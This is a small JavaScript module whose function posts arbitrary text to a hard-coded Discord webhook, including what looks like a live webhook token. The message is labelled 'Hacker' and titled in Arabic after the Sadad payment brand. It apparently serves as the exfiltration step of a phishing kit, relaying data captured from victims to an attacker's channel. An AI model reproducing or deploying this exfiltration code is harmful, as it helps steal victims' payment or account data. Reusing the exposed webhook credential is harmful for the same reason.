import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325020179222237245/z8IsgPKuCGgLMprW9H8zOG2cSdiDz6iwT_6oBSvzHKCMbH4Jp-dDQScdZDM9DG73DKNp",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
